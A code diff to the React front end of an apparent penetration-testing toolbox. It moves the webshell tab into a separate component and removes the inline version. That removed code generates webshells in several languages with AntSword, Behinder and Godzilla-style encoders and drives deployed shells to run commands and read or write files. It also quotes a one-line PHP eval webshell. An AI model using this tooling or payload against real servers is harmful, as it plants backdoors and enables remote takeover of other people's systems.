@@ -11,6 +11,7 @@ import {
   CameraIcon, HammerIcon, PlayIcon, SquareIcon, WandIcon, StarIcon, TrashIcon,
   RadarIcon, FolderSearchIcon, ChefHatIcon, TerminalIcon, ShieldIcon,
 } from "lucide-react";
+import WebshellConsole from "./_components/webshell-console";
 
 interface Hop {
   request_sent: string;
@@ -122,7 +123,7 @@ export default function ToolboxPage() {
       {tab === "cyberchef" && <CyberChefTab />}
       {tab === "portscan" && <PortScanTab />}
       {tab === "dirscan" && <DirScanTab />}
-      {tab === "webshell" && <WebshellTab />}
+      {tab === "webshell" && <WebshellConsole />}
       {tab === "c2" && <C2Tab />}
     </div>
   );
@@ -931,148 +932,6 @@ function DirScanTab() {
           </CardContent>
         </Card>
       </div>
-    </div>
-  );
-}
-
-// ==================== Webshell ====================
-
-const WS_SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
-const WS_ENCODERS = [
-  { key: "raw", label: "raw（蚁剑 base64）" },
-  { key: "aes", label: "aes（冰蝎 3.0）" },
-  { key: "xor", label: "xor（哥斯拉）" },
-];
-
-function WebshellTab() {
-  // 生成区
-  const [gsType, setGsType] = React.useState("php");
-  const [gsEnc, setGsEnc] = React.useState("raw");
-  const [gsPwd, setGsPwd] = React.useState("");
-  const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
-  const [genBusy, setGenBusy] = React.useState(false);
-  const [copied, setCopied] = React.useState(false);
-  // 连接区
-  const [url, setUrl] = React.useState("");
-  const [pwd, setPwd] = React.useState("");
-  const [enc, setEnc] = React.useState("raw");
-  const [st, setSt] = React.useState("php");
-  const [op, setOp] = React.useState("exec");
-  const [cmd, setCmd] = React.useState("whoami");
-  const [path, setPath] = React.useState("");
-  const [content, setContent] = React.useState("");
-  const [out, setOut] = React.useState("");
-  const [busy, setBusy] = React.useState(false);
-
-  const generate = async () => {
-    if (!gsPwd.trim()) return void window.alert("密码必填");
-    setGenBusy(true);
-    try {
-      const r = await api.webshellGenerate({ script_type: gsType, encoder: gsEnc, password: gsPwd });
-      setGen(r.data);
-    } catch (e) {
-      window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
-    } finally {
-      setGenBusy(false);
-    }
-  };
-
-  const run = async (opv?: string) => {
-    if (!url.trim() || !pwd.trim()) return void window.alert("URL 与密码必填");
-    setBusy(true);
-    setOut("");
-    try {
-      const r = await api.webshellExec({
-        url, password: pwd, encoder: enc, script_type: st,
-        op: opv || op, cmd, path, content,
-      });
-      const d = r.data;
-      setOut(d.ok ? `[成功] ${d.output}${d.cwd ? "\n[cwd] " + d.cwd : ""}` : `[失败] ${d.error}`);
-    } catch (e) {
-      setOut("[错误] " + (e instanceof Error ? e.message : String(e)));
-    } finally {
-      setBusy(false);
-    }
-  };
-
-  return (
-    <div className="grid gap-3 lg:grid-cols-2">
-      <Card>
-        <CardHeader className="py-2"><CardTitle className="text-sm">生成 Webshell</CardTitle></CardHeader>
-        <CardContent className="space-y-2 p-3 text-sm">
-          <div className="grid grid-cols-3 gap-2">
-            <select className="rounded border bg-transparent p-1.5 text-sm" value={gsType} onChange={(e) => setGsType(e.target.value)}>
-              {WS_SCRIPT_TYPES.map((t) => <option key={t} value={t}>{t}</option>)}
-            </select>
-            <select className="rounded border bg-transparent p-1.5 text-sm" value={gsEnc} onChange={(e) => setGsEnc(e.target.value)}>
-              {WS_ENCODERS.map((t) => <option key={t.key} value={t.key}>{t.label}</option>)}
-            </select>
-            <Input placeholder="连接密码" value={gsPwd} onChange={(e) => setGsPwd(e.target.value)} />
-          </div>
-          <div className="text-xs text-muted-foreground">
-            php/jsp/jspx/py/node 支持 raw/aes/xor；asp/aspx 仅 raw。form-cmd 编码器不生成文件（配合一句话 `&lt;?php eval($_POST[&apos;cmd&apos;]); ?&gt;`，连接时编码器选 raw 亦可直连）。
-          </div>
-          <Button size="sm" onClick={generate} disabled={genBusy}>
-            <PlayIcon className="mr-1 size-4" /> {genBusy ? "生成中…" : "生成"}
-          </Button>
-          {gen && (
-            <div className="space-y-1">
-              <div className="flex items-center justify-between text-xs text-muted-foreground">
-                <span>已存 {gen.path}（{gen.size} 字节）—— 部署到目标后用右侧连接</span>
-                <Button
-                  variant="outline" size="sm"
-                  onClick={async () => {
-                    await navigator.clipboard.writeText(gen.code);
-                    setCopied(true);
-                    setTimeout(() => setCopied(false), 1500);
-                  }}
-                >
-                  {copied ? "已复制 ✓" : "复制代码"}
-                </Button>
-              </div>
-              <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px] leading-relaxed">{gen.code}</pre>
-            </div>
-          )}
-        </CardContent>
-      </Card>
-
-      <Card>
-        <CardHeader className="py-2"><CardTitle className="text-sm">连接 / 执行</CardTitle></CardHeader>
-        <CardContent className="space-y-2 p-3 text-sm">
-          <div className="grid grid-cols-2 gap-2">
-            <Input placeholder="shell URL（http://target/shell.php）" value={url} onChange={(e) => setUrl(e.target.value)} />
-            <Input placeholder="密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
-          </div>
-          <div className="grid grid-cols-3 gap-2">
-            <select className="rounded border bg-transparent p-1.5 text-sm" value={enc} onChange={(e) => setEnc(e.target.value)}>
-              {WS_ENCODERS.map((t) => <option key={t.key} value={t.key}>{t.key}</option>)}
-            </select>
-            <select className="rounded border bg-transparent p-1.5 text-sm" value={st} onChange={(e) => setSt(e.target.value)}>
-              {WS_SCRIPT_TYPES.map((t) => <option key={t} value={t}>{t}</option>)}
-            </select>
-            <select className="rounded border bg-transparent p-1.5 text-sm" value={op} onChange={(e) => setOp(e.target.value)}>
-              <option value="exec">exec 执行命令</option>
-              <option value="test">test 连通性</option>
-              <option value="list">list 列目录</option>
-              <option value="read">read 读文件</option>
-              <option value="write">write 写文件</option>
-            </select>
-          </div>
-          {op === "exec" && <Input placeholder="命令" value={cmd} onChange={(e) => setCmd(e.target.value)} />}
-          {(op === "list" || op === "read" || op === "write") && <Input placeholder="目标路径（/var/www）" value={path} onChange={(e) => setPath(e.target.value)} />}
-          {op === "write" && <textarea className="h-20 w-full rounded border bg-transparent p-2 font-mono text-xs" placeholder="写入内容（文本）" value={content} onChange={(e) => setContent(e.target.value)} />}
-          <div className="flex items-center gap-2">
-            <Button size="sm" onClick={() => run()} disabled={busy}>
-              <PlayIcon className="mr-1 size-4" /> {busy ? "执行中…" : "执行"}
-            </Button>
-            <Button variant="outline" size="sm" onClick={() => run("test")} disabled={busy}>先测连通</Button>
-            <span className="text-xs text-muted-foreground">仅用于授权渗透测试。</span>
-          </div>
-          {out && (
-            <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px] leading-relaxed">{out}</pre>
-          )}
-        </CardContent>
-      </Card>
     </div>
   );
 }
